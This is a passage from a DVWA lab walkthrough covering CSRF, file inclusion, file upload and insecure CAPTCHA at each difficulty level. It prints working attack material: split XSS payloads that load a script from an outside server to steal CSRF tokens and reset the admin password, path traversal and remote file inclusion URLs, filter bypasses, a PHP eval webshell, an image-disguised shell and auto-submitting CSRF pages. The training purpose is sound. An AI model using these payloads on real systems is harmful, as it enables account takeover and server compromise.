Since cross-domain is not possible, we need to inject the attack code into the dvwa target machine to complete the attack. Next, we will use the High level storage XSS vulnerability to help obtain the Anti-CSRF token (because the XSS injection here has a length Limitation, can not inject a complete attack script, so only get Anti-CSRF token).

The injection code is as follows <iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>

Alternative customs clearance

Modify the password after obtaining the token through XSS

The same level of XSS-Stored $name can be used by us as XSS, so that we can cooperate with CSRF to reset user passwords.

It is necessary to explain the database design of DVWA first. The name field type of the guestbook table is varchar(100), which means that the name can only be written with a maximum of 100 characters, and the excess characters will be discarded by the database and not stored.

Split the payload into multiple submissions due to the 100 character limit

<svg/onload="s='&#115;&#99;&#114;&#105;&#112;&#116;'">  # 事件内可以解析ASCII编码后的字符串
<svg/onload="j=document.createElement(s)">  # 拼接出一个script来引入外部js
<svg/onload="j.src='http://<服务器B>/x.js'">
<svg/onload="document.body.appendChild(j)">




In this way, the regular filtering of the backend can be bypassed

For the convenience of testing, only alert('HelloDVWA') is written in x.js



The discovery was successful!!! x.js was successfully loaded. But there are still problems with multiple loads

Use delay, manual intervention to execute timing

<svg/onload="setTimeout(function(){s='&#115;&#99;&#114;&#105;&#112;&#116;'},3000)">
<svg/onload="setTimeout(function(){j=document.createElement(s)},4000)">
<svg/onload="setTimeout(function(){j.src='http://<服务器B>/x.js'},5000)">
<svg/onload="setTimeout(function(){document.body.appendChild(j)},6000)">

stable trigger

Modify x.js below

ifr = document.createElement('iframe');
ifr.src="../csrf";
ifr.hidden=1;
document.body.appendChild(ifr);
setTimeout(function(){f=frames[0];t=f.document.getElementsByName('user_token')[0].value;i=document.createElement('img');i.src='../csrf/?password_new=admin&password_conf=admin&Change=Change&user_token='+t;},3000)


When the administrator visits the message board XSS-Stored:

Will load x.js first
The script content in x.js will create a hidden iframe tag to the DOM
After waiting for the iframe to be created, a request to change the password is automatically triggered by creating an img tag
Impossible
Server-side core code


<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$pass_curr = $_GET[ 'password_current' ];
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Sanitise current password input
	$pass_curr = stripslashes( $pass_curr );
	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_curr = md5( $pass_curr );

	// Check that the current password is correct
	$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
	$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
	$data->execute();

	// Do both new passwords match and does the current password match the user?
	if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
		// It does!
		$pass_new = stripslashes( $pass_new );
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database with new password
		$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
		$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
		$data->execute();

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match or current password incorrect.</pre>";
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>


It can be seen that the code at the Impossible level uses PDO technology to defend against SQL injection. As for protecting against CSRF, the user is required to enter the original password (simple and rude). The attacker cannot perform CSRF attacks without knowing the original password.

File_Inclusion
File Inclusion, which means file inclusion (vulnerability), means that when the server enables the allow_url_include option, it can use some of the feature functions of PHP (include(), require() and include_once(), require_once()) to use url to dynamically Include files. If the source of the file is not strictly checked at this time, it will lead to arbitrary file reading or arbitrary command execution. File inclusion vulnerabilities are divided into local file inclusion vulnerabilities and remote file inclusion vulnerabilities. The remote file inclusion vulnerability is due to the opening of php The allow_url_fopen option in the configuration (after the option is turned on, the server allows to include a remote file).

Open these two parameters in phpstudy

Low
Server-side core code


<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>




It can be seen that the server does not perform any filtering and checking on the page parameter.

The server expects the user to click the following three links, and the server will include the corresponding file and return the result. It should be noted that when the server includes a file, regardless of whether the file suffix is php, it will try to execute it as a php file. If the content of the file is indeed php, it will be executed normally and the result will be returned. If not, the content of the file will be printed intact, so file inclusion vulnerabilities often lead to arbitrary file reading and arbitrary command execution.

After clicking file1.php, the display is as follows



In reality, malicious attackers will not obediently click on these links, so the page parameter is uncontrollable.

The local file contains

Construct urlhttp://<IP address!!!>/dvwa/vulnerabilities/fi/page=/etc/shadow to report an error, showing that there is no such file, indicating that the server system is not Linux, but at the same time, the absolute path of the server file is exposed


Construct url (absolute path)

http://<IP address!!!>/dvwa/vulnerabilities/fi/page=C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini



Successfully read the server's php.ini file

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=file4.php

Construct url (relative path)

http://<IP address!!!>/dvwa/vulnerabilities/fi/page=../../../../../../../../../phpStudy/PHPTutorial /WWW/DVWA/php.ini

Adding so many ../ is to ensure that the root directory of the C drive of the server is reached, and it can be seen that the read is successful.



At the same time, we can see that the Magic_quote_gpc option in the configuration file is off. In the server whose PHP version is less than 5.3.4, when the Magic_quote_gpc option is off, we can use %00 in the file name to truncate, that is to say, in the file name The content after %00 will not be recognized, that is, the following two urls are completely equivalent.

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/ PHPTutorial/WWW/DVWA/php.ini

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/ PHPTutorial/WWW/DVWA/php.ini%0012.php

Some filtering rules can be bypassed by using %00 truncation. For example, the suffix of the page parameter must be php. At this time, link A will fail to read, but link B can be successfully read bypassing the rules.

The remote file contains

When the server's php configuration, the options allow_url_fopen and allow_url_include are enabled, the server will allow files on the remote server to be included. If the source of the file is not checked, it will easily lead to arbitrary remote code execution.

Upload a phpinfo.txt file on the remote server B, the content is as follows



<?php

phpinfo();

?>


Construct url http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=http://<Server B IP address!!!>/phpinfo.txt

Successfully executed the phpinfo function on the server



In order to increase the concealment, http://<server B IP address!!!>/phpinfo.txt can be URL-encoded

For example

http://192.168.72.128/dvwa/vulnerabilities/fi/?page=http://192.168.72.138/phpinfo.txt

can be coded as

http://192.168.72.128/dvwa/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%37% 32%2e%31%33%38%2f%70%68%70%69%6e%66%6f%2e%74%78%74 can also be executed successfully

Medium
Server-side core code

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>



It can be seen that the code at the Medium level adds the str_replace function, and performs certain processing on the page parameter, replacing "http:// ", "https://", " ../", ".." with empty characters, i.e. delete.

related functions

str_replace() The str_replace() function replaces some characters in a string with other characters (case sensitive).

This function must obey the following rules:

If the searched string is an array then it will return the array.
If the searched string is an array, then it will perform a find and replace on each element in the array.
If the array needs to be searched and replaced at the same time, and the number of elements to be replaced is less than the number of found elements, the redundant elements will be replaced with empty strings
If the search is an array and the replacement is a string, the replacement string will be applied to all found values.
exploit

Using the str_replace function is extremely unsafe, as the replacement rules can be bypassed using doublewriting.

For example, when page=hthttp://tp://<IP address!!!>/phpinfo.txt, the str_replace function will delete http://, so page=http://<IP address!!!>/phpinfo .txt, the remote command was successfully executed.

At the same time, because only "../" and ".." are replaced, there will be no restrictions on including files with absolute paths.

The local file contains

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././.../. /..././..././..././..././phpStudy/PHPTutorial/WWW/DVWA/php.ini Read the configuration file successfully



The remote file contains

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=hhttp://ttp://<IP address of server B!!!>/phpinfo.txt The remote execution command is successful



The encoded url cannot bypass the replacement rules, because the decoding is done on the browser side, and the page parameter sent in the past is still http://<IP address!!!>/phpinfo.txt, so the reading fails.

High
Server-side core code


<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}

?>



It can be seen that the code at the High level uses the fnmatch function to check the page parameter, requiring that the beginning of the page parameter must be file, and the server will include the corresponding file.

related functions

fnmatch(pattern, string, flags)

Function to match filenames or strings against the specified pattern.

This function is especially useful for filenames, but can also be used with ordinary strings. Ordinary users are probably used to shell patterns or at least the '?' and '*' wildcards in their simplest form, so use fnmatch() instead of ereg( ) or preg_match() for front-end search expression input is more convenient for non-programmer users.

Note: The fnmatch function is applicable to PHP >= 4.3.0, so it can only be used if the PHP version is higher than this, otherwise it will appear that the high level page cannot be opened.

exploit

The High level code stipulates that only files starting with file can be included. It seems safe, but unfortunately we can still use the file protocol to bypass the protection strategy. The file protocol is actually familiar to us. When we open a local file with a browser, The file protocol is used.

Construct url http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=file://C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini



As for the execution of arbitrary commands, it is necessary to cooperate with the file upload vulnerability exploit. First, a file with the content of php needs to be uploaded, and then the file protocol is used to include the uploaded file (need to know the absolute path of the uploaded file), so as to realize arbitrary command execution.

Impossible
Server-side core code




<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}

?>


It can be seen that the code at the Impossible level uses a whitelist mechanism for protection, which is simple and rude. The page parameter must be one of "include.php", "file1.php", "file2.php", and "file3.php". Put an end to file inclusion loopholes.

File_Upload
File Upload, that is, a file upload vulnerability, is usually due to the lack of strict filtering and inspection of the uploaded file type and content, so that the attacker can obtain the webshell authority of the server by uploading a Trojan horse, so the damage caused by the file upload vulnerability is often devastating Specifically, Apache, Tomcat, Nginx, etc. have exposed file upload vulnerabilities.

First look at the regular file upload operation

client upload

The enctype attribute in the HTML <form> tag specifies how the form data should be encoded before being sent to the server. It has three values:


application/x-www-form-urlencoded: 在发送前编码所有字符(默认)

multipart/form-data: 不对字符编码.在使用包含文件上传控件的表单时,必须使用该值.

text/plain: 空格转换为 "+" 加号,但不对特殊字符编码.



server receive

Use the $_FILES array to receive parameters. Print $_FILES print_r($_FILES); It is found that the attributes when uploading a file are

[name] => feng.jpeg     文件的名称
[type] => image/jpeg 	文件的MIME类型
[tmp_name] => C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置
[error] => 0       文件的错误信息  0 ok      1234 error
[size] => 2859    文件的大小



Conditions for Exploitation of File Upload Vulnerabilities

1. 能够成功上传木马文件
2. 上传文件必须能够被执行
3. 上传文件的路径必须可知


Low
Server-side core code


<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// Can we move the file to the upload folder?
	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
		// No
		$html .= '<pre>Your image was not uploaded.</pre>';
	}
	else {
		// Yes!
		$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
	}
}

?>



basename(path, suffix)

The function returns the file name part of the path. If the optional parameter suffix is empty, the returned file name includes the suffix, otherwise it does not include the suffix.

Parameter introduction:

$path: Required. Specifies the path to check. On Windows, both slashes (/) and backslashes () can be used as directory separators. In other environments, slashes (/).

$suffix: Optional. Specifies the file extension. If the file has a suffix, this extension will not be output.

It can be seen that the server does not check and filter the type and content of the uploaded file, and there are obvious file upload loopholes. After generating the upload path, the server will check whether the upload is successful and return a corresponding prompt message.

exploit

There are restrictions on exploiting file upload vulnerabilities. First of all, the Trojan horse file must be able to be successfully uploaded. Secondly, the uploaded file must be able to be executed. Finally, the path of the uploaded file must be known. Unfortunately, all three conditions are met here.

Upload file shell.php (one sentence Trojan horse)



<?php @eval($_POST['ant']); ?>


The upload is successful, and the upload path is returned



Note: It is recommended to use the open source antSword to connect to the webshell, and the installation steps are omitted here

http://<IP address!!!>/dvwa/hackable/uploads/shell.php



Then antSword will send a post request containing ant parameters to the server, execute arbitrary commands on the server, and obtain webshell permissions. You can download and modify all files on the server.



Medium
Server-side core code


<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

	// Is it an image?
	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
		( $uploaded_size < 100000 ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>


It can be seen that the Medium-level code restricts the type and size of the uploaded file. The file type must be jpeg or png, and the size cannot exceed 100000B (about 97.6KB).

Combined boxing (file inclusion + file upload)

Because the one-sentence Trojan horse is used, there will be no problem with the file size. As for the file type check, try to modify the file name to shell.png, and the upload is successful



Try to use antSword to connect, unfortunately, although the file is successfully uploaded, but the webshell permission cannot be successfully obtained, and an error will be reported on antSword

This is because the principle of antSword is to send a post request containing the ant parameter to the uploaded file, and execute different commands by controlling the ant parameter, and here the server parses the Trojan file into an image file, so when sending a post request to it, the server only The "image" file will be returned, and the corresponding command will not be executed.

Here you can use the medium-level file to contain vulnerabilities to obtain webshell permissions http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=hthttp://tp://<IP address!!!>/ dvwa/hackable/uploads/shell.png

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././.../. /..././..././..././..././phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/shell.php

Note: The post here requires a cookie request with a Medium level. AntSword does not seem to support access with cookies. I configure the burp proxy by myself and use burp to capture packets and add cookies for access.

 

Capture packet modification file type Upload shell.png file, capture packet.



You can see that the file type is image/png, try to modify the filename to shell.php.



Uploaded successfully. Connect on antSword

Truncated Bypass Rules

In servers whose php version is less than 5.3.4, when the Magic_quote_gpc option is off, %00 can be used to truncate the file name, so the uploaded file can be named shell.php%00.png.



It can be seen that the file type in the package is image/png, which can be checked by the file type. The upload is successful.

The server will think that its file name is shell.php, and parse it as a php file.

High
Server-side core code

<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
		( $uploaded_size < 100000 ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>



strrpos(string, find, start)

The function returns the position of the last occurrence of the string find in another string string, or false if the string is not found, and the optional parameter start specifies where to start the search.

strtolower(string)

Convert a string to lowercase.

getimagesize(string filename)

The function will return information such as the length and width of the image by reading the file header. If there is no relevant image file header, the function will report an error.

It can be seen that the code at the High level reads the string after the last . in the file name, and expects to limit the file type through the file name, so the format of the uploaded file name must be one of *.jpg, *.jpeg, and *.png 1. At the same time, the getimagesize function restricts the file header of the uploaded file to be an image type.

Vulnerability Exploitation Using the method of %00 truncation can easily bypass the file name check, but the file header of the uploaded file needs to be disguised as a picture. Here only demonstrates how to use the High level file inclusion vulnerability to complete the attack.

Knowledge about file headers under popular science, the file header identification of common image formats is as follows:




JPEG/JPG - 文件头标识 (2 bytes): FF D8 (SOI) (JPEG 文件标识) - 文件结束标识 (2 bytes): FF D9 (EOI)

PNG - 文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A

GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61 |GIF89(7)a



For more formats of file header identifiers, see the article: Judging the image format by file header identifiers

File header spoofing: Forge the file header to make the file header logo the same, and we modify the other parts into a one-sentence Trojan horse, which becomes the picture sentence we often say.

First use copy to merge the one-sentence Trojan file php.php with the image file 1.jpg

copy 1.jpg/b+php.php/a shell.jpg



Open it and you can see that the one-sentence Trojan horse is hidden at the end. It passes the file header check and can be uploaded successfully.



Note: I built the phpstury environment on win10 bare metal. During this step of uploading, it failed all the time. Later, I found that windows defender killed the uploaded pictures, so if similar problems occur, you can check the antivirus situation.

antSword connection:

http://<IP address!!!>/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/shell.jpg

Here is the same as above, capture the packet yourself and add the cookie



Impossible
Server-side core code


<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Where are we going to be writing to?
	$target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
	//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
	$temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
		( $uploaded_size < 100000 ) &&
		( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
		if( $uploaded_type == 'image/jpeg' ) {
			$img = imagecreatefromjpeg( $uploaded_tmp );
			imagejpeg( $img, $temp_file, 100);
		}
		else {
			$img = imagecreatefrompng( $uploaded_tmp );
			imagepng( $img, $temp_file, 9);
		}
		imagedestroy( $img );

		// Can we move the file to the web root from the temp folder?
		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
			// Yes!
			$html .= "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
		}
		else {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}

		// Delete any temp files
		if( file_exists( $temp_file ) )
			unlink( $temp_file );
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>

in_get(varname)

The function returns the value of the corresponding option

imagecreatefromjpeg( filename )

The function returns the image ID of the image file, and returns false if it fails

imagejpeg( image , filename , quality)

Create a JPEG image from the image with filename as the filename, optional parameter quality, ranging from 0 (worst quality, smaller file size) to 100 (best quality, largest file size).

imagedestroy( img )

The function destroys the image resource

It can be seen that the Impossible level code renames the uploaded file (md5 value, resulting in %00 truncation cannot bypass the filtering rules), adds Anti-CSRF token to protect against CSRF attacks, and strictly checks the content of the file , preventing attackers from uploading files containing malicious scripts.

Insecure_CAPTCHA
Insecure CAPTCHA, meaning insecure verification code, CAPTCHA is the abbreviation of Completely Automated Public Turing Test to Tell Computers and Humans Apart (Turing Test to Tell Computers and Humans Fully Automatically). But personally feel that the content of this module is called insecure A secure verification process is more appropriate, because this is mainly due to a logical loophole in the verification process, and Google's verification code means that it will not bear the blame.

In this step, the server does not need to overturn the wall, mainly to bypass the verification code. Go to https://www.google.com/recaptcha/admin/create to apply for a key, and fill in the information casually

Add the following API key in dvwa\config\config.inc.php




$_DVWA[ 'recaptcha_public_key' ]  = '你的公钥';
$_DVWA[ 'recaptcha_private_key' ] = '你的私钥';




reCAPTCHA verification process

The verification code of this module uses the reCAPTCHA service provided by Google. The following figure shows the specific process of verification.



The server checks the correctness of user input by calling the recaptcha_check_answer function.

recaptcha_check_answer ($privkey, $remoteip, $challenge, $response)

The number $privkey is the private key requested by the server, $remoteip is the user's ip, $challenge is the value of the recaptcha_challenge_field field, from the front-end page, and $response is the value of the recaptcha_response_field field. The function returns an instance of the ReCaptchaResponse class, and the ReCaptchaResponse class has 2 attributes :

$is_valid is Boolean, indicating whether the verification is valid,
$error is the returned error code.
Low
Server-side core code



<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key'],
		$_POST['g-recaptcha-response']
	);

	// Did the CAPTCHA fail?
	if( !$resp ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
	else {
		// CAPTCHA was correct. Do both new passwords match?
		if( $pass_new == $pass_conf ) {
			// Show next stage for the user
			$html .= "
				<pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
				<form action=\"#\" method=\"POST\">
					<input type=\"hidden\" name=\"step\" value=\"2\" />
					<input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
					<input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
					<input type=\"submit\" name=\"Change\" value=\"Change\" />
				</form>";
		}
		else {
			// Both new passwords do not match.
			$html     .= "<pre>Both passwords must match.</pre>";
			$hide_form = false;
		}
	}
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check to see if both password match
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the end user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with the passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
		$hide_form = false;
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>



It can be seen that the server divides the encryption operation into two steps. The first step is to check the verification code entered by the user. After the verification is passed, the server returns the form. In the second step, the client submits a post request, and the server completes the operation of changing the password. However, There are obvious logical loopholes in this, the server only checks the Change and step parameters to determine whether the user has entered the correct verification code.

Bypassing the first step of the validation process via construction parameters

First enter the password, click the Change button, capture the packet, and change the step parameter to bypass the verification code:



ps: Because there is no overturning the wall, the verification code cannot be successfully displayed, and there are no two parameters recaptcha_challenge_field and recaptcha_response_field in the sent request packet

CSRF

Since there is no anti-CSRF mechanism, we can easily construct an attack page. The page code is as follows



<html>

<body onload="document.getElementById('transfer').submit()">

  <div>

    <form method="POST" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/captcha/">

		<input type="hidden" name="password_new" value="password">

		<input type="hidden" name="password_conf" value="password">

		<input type="hidden" name="step" value="2"

		<input type="hidden" name="Change" value="Change">

	</form>

  </div>

</body>

</html>



When the victim visits this page, the attack script will forge a request to change the password and send it to the server. The fly in the ointment is that the victim will see the interface of changing the password successfully (this is because after the password is changed successfully, the server will return 302 to realize automatic jump Turn), so that they realize that they have been attacked

Medium
Server-side core code





<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key' ],
		$_POST['g-recaptcha-response']
	);

	// Did the CAPTCHA fail?
	if( !$resp ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
	else {
		// CAPTCHA was correct. Do both new passwords match?
		if( $pass_new == $pass_conf ) {
			// Show next stage for the user
			$html .= "
				<pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
				<form action=\"#\" method=\"POST\">
					<input type=\"hidden\" name=\"step\" value=\"2\" />
					<input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
					<input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
					<input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
					<input type=\"submit\" name=\"Change\" value=\"Change\" />
				</form>";
		}
		else {
			// Both new passwords do not match.
			$html     .= "<pre>Both passwords must match.</pre>";
			$hide_form = false;
		}
	}
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check to see if they did stage 1
	if( !$_POST[ 'passed_captcha' ] ) {
		$html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
		$hide_form = false;
		return;
	}

	// Check to see if both password match
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the end user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with the passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
		$hide_form = false;
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>




It can be seen that the Medium-level code participated in the inspection of the parameter passed_captcha in the second step of verification. If the parameter value is true, it is considered that the user has passed the verification code check. However, the user can still bypass the verification by forging parameters. Essentially, this is no different from Low level validation.

You can bypass the verification code by capturing packets, changing the step parameter, and increasing the passed_captcha parameter.



CSRF

CSRF attacks can still be implemented, and the attack page code is as follows.



<html>

<body onload="document.getElementById('transfer').submit()">

  <div>

    <form method="POST" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/captcha/">

